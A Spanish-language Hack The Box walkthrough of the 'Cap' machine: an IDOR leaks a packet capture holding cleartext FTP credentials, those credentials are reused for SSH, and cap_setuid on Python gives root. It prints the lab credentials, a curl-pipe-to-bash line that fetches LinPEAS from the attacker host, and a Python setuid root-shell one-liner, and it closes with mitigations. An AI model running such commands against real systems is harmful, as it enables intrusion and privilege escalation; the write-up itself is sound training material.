---
title: "HTB Walkthrough: Cap"
date: 2026-04-14
draft: false
description: "Walkthrough completo de la máquina Cap de Hack The Box. Dificultad Easy, OS Linux (Ubuntu 20.04 LTS). IDOR en endpoint de descarga de PCAP, credenciales FTP en texto claro y escalada mediante Linux Capability cap_setuid en Python 3.8."
tags: ["HackTheBox", "Linux", "Easy", "IDOR", "FTP", "PCAP", "Wireshark", "LinuxCapabilities", "cap_setuid", "PrivEsc", "cap", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Cap** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux (Ubuntu 20.04 LTS)**. Explotamos un IDOR en un endpoint de descarga de capturas de red para obtener credenciales FTP en texto claro, accedemos por SSH reutilizando la contraseña, y escalamos a root aprovechando la capability `cap_setuid` asignada al binario de Python 3.8.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                          |
|----------------|------------------------------------------------------------------|
| **Nombre**     | Cap                                                              |
| **OS**         | Linux (Ubuntu 20.04 LTS)                                         |
| **Dificultad** | Easy                                                             |
| **IP**         | 10.129.19.177                                                    |
| **Técnicas**   | IDOR · FTP Cleartext · Credential Reuse · Linux cap_setuid       |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.177
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -sC -sV -p21,22,80 10.129.19.177
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

*Puertos abiertos:*
- `21` → vsftpd 3.0.3 (acceso anónimo deshabilitado — necesitaremos credenciales)
- `22` → OpenSSH 8.2p1 (disponible para acceso posterior)
- `80` → Aplicación web Python (Gunicorn) con un "Security Dashboard"

> **💡 Dato clave:** Gunicorn es un servidor WSGI de Python — la aplicación web está escrita en Python. Combinado con el FTP sin acceso anónimo, el vector inicial probablemente pasa por la web.

### 1.2 Enumeración Web — Security Dashboard

La aplicación expone un panel de seguridad con varias secciones:

- **Dashboard** — Métricas de eventos de seguridad en tiempo real.
- **Security Snapshot** — Genera y descarga una captura PCAP de 5 segundos del tráfico de red del servidor.
- **IP Config** — Muestra la salida de `ifconfig` del servidor.
- **Network Status** — Estado de la red.

La sección más interesante es **Security Snapshot**. Al pulsar el botón de descarga, la URL generada es:

```
http://10.129.19.177/data/1
```

El número al final es un **ID numérico secuencial** que identifica la captura. La captura actual (ID=1) muestra todo a ceros — fue generada en el momento y no contiene tráfico previo.

Probamos con **ID=0**, la captura más antigua del servidor:

```
http://10.129.19.177/data/0
```

La respuesta muestra datos reales: 72 paquetes capturados, 69 TCP. El servidor sirve la captura sin verificar si pertenece a nuestro usuario.

> **💡 IDOR (Insecure Direct Object Reference):** La aplicación usa IDs predecibles y no valida que el recurso solicitado pertenezca al usuario autenticado. Simplemente cambiar el número en la URL nos da acceso a capturas de otros usuarios o del sistema.

---

## 2. Explotación — IDOR y Análisis del PCAP

### 2.1 Análisis de la Vulnerabilidad

El endpoint `/data/<id>` entrega el archivo PCAP correspondiente al ID sin ninguna verificación de autorización. Como los IDs son enteros secuenciales empezando en 0, podemos iterar desde cero para encontrar capturas con tráfico real generado antes de nuestra sesión.

```
Flujo normal:    usuario genera captura → recibe /data/<su_id>
Flujo malicioso: atacante solicita /data/0 → recibe captura ajena con tráfico real
```

### 2.2 Extracción de Credenciales con Wireshark

Descargamos el PCAP del ID=0 y lo abrimos con Wireshark. Filtramos por protocolo FTP:

```
Filtro Wireshark: ftp
```

FTP transmite las credenciales en texto claro sin ningún cifrado. En el tráfico capturado vemos el intercambio completo de autenticación:

```
→ Request:  USER nathan
← Response: 331 Please specify password
→ Request:  PASS Buck3tH4TF0RM3!
← Response: 230 Login successful
```

> **🔑 Credenciales obtenidas:** `nathan:Buck3tH4TF0RM3!`

---

## 3. User Flag

Las credenciales FTP son un candidato directo para SSH por reutilización de contraseñas — es un error muy frecuente usar la misma contraseña en múltiples servicios del mismo sistema:

```bash
ssh nathan@10.129.19.177
# Password: Buck3tH4TF0RM3!
```

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
nathan@cap:~$
```

```bash
nathan@cap:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 4. Escalada de Privilegios — Linux Capability `cap_setuid`

### 4.1 Enumeración del Sistema

```bash
nathan@cap:~$ sudo -l
Sorry, user nathan may not run sudo on cap.

nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

Sin sudo. Ejecutamos LinPEAS para buscar vectores de escalada:

```bash
# En la máquina atacante
python3 -m http.server 8000

# En la máquina víctima
curl -L http://10.10.15.237/linpeas.sh | bash
```

LinPEAS detecta algo crítico en la sección de **Linux Capabilities**:

```
Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### 4.2 Análisis del Vector de Escalada

Las **Linux Capabilities** son un mecanismo del kernel que divide los privilegios de root en unidades más pequeñas y granulares. En lugar de conceder acceso root completo, se puede asignar solo la capacidad específica que un proceso necesita. El problema surge cuando esa capacidad es demasiado poderosa.

La capability **`cap_setuid`** permite al proceso **cambiar su UID efectivo a cualquier valor**, incluido el 0 (root). Al estar asignada al binario `/usr/bin/python3.8`, cualquier script Python ejecutado con ese intérprete puede llamar a `os.setuid(0)` y convertirse en root.

Podemos encontrar todos los binarios con capabilities en el sistema con:

```bash
getcap -r / 2>/dev/null
```

> **💡 Diferencia con el bit SUID:** Un binario con SUID siempre ejecuta con el UID del propietario del archivo. Las capabilities son más granulares, pero `cap_setuid` es igual de peligrosa — en la práctica, ambas permiten escalar a root si el binario es un intérprete de scripts como Python.

### 4.3 Explotación

El exploit se reduce a dos líneas de Python: cambiar el UID efectivo a 0 y abrir una shell con ese contexto.

```bash
nathan@cap:~$ python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

```
root@cap:~# id
uid=0(root) gid=1000(nathan) groups=1000(nathan)
```

✅ **Shell de root obtenida mediante `cap_setuid` en Python 3.8.**

---

## 5. Root Flag

```bash
root@cap:~# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 6. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 80 con Security Dashboard (Gunicorn/Python); FTP sin acceso anónimo.
2. **IDOR** → Endpoint `/data/0` sirve PCAP ajeno sin verificar autorización.
3. **Análisis PCAP** → Wireshark filtra tráfico FTP → credenciales `nathan:Buck3tH4TF0RM3!` en texto claro.
4. **Foothold** → SSH con credenciales reutilizadas → `user.txt`.
5. **PrivEsc** → LinPEAS detecta `cap_setuid` en `/usr/bin/python3.8` → `os.setuid(0)` → shell como root → `root.txt`.

**Lo que aprendí con esta máquina:**

- **IDOR es una vulnerabilidad de lógica, no de tecnología.** No requiere ningún exploit complejo — solo cambiar un número en la URL. La defensa tampoco es compleja: verificar en el servidor que el recurso solicitado pertenece al usuario autenticado antes de servirlo. Lo que hace que IDOR sea peligroso es lo invisible que resulta sin una revisión activa del código.

- **FTP transmite credenciales en texto claro — siempre.** No hay modo cifrado en FTP estándar. Cualquier captura de tráfico de red que incluya una sesión FTP contendrá las credenciales legibles directamente. La alternativa es SFTP (SSH File Transfer Protocol) o FTPS (FTP sobre TLS), que cifran la comunicación completa.

- **La reutilización de contraseñas entre servicios del mismo sistema es un multiplicador de riesgo.** Una credencial comprometida en FTP se convirtió en acceso SSH. Política básica: cada servicio debe tener credenciales independientes.

- **`cap_setuid` en un intérprete de scripts es equivalente a root.** A diferencia de un binario compilado donde el control de flujo está fijo, un intérprete como Python ejecuta cualquier código arbitrario. Asignar `cap_setuid` a Python es efectivamente dar root a cualquier usuario que pueda ejecutar scripts Python — las capabilities solo son seguras en binarios con funcionalidad muy acotada.

- **LinPEAS y la enumeración de capabilities son pasos obligatorios en PrivEsc de Linux.** Los checks habituales (sudo, SUID, cron) no cubren capabilities. `getcap -r / 2>/dev/null` debería ser siempre parte del checklist de enumeración post-acceso.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| IDOR en `/data/<id>` | Verificar en el servidor que el ID solicitado pertenece al usuario autenticado antes de servir el archivo |
| FTP en texto claro | Reemplazar FTP por SFTP o FTPS; nunca transmitir credenciales sin cifrar |
| Reutilización de contraseñas | Política de credenciales únicas por servicio; gestor de contraseñas |
| `cap_setuid` en Python 3.8 | Eliminar la capability: `setcap -r /usr/bin/python3.8`; auditar regularmente con `getcap -r /` |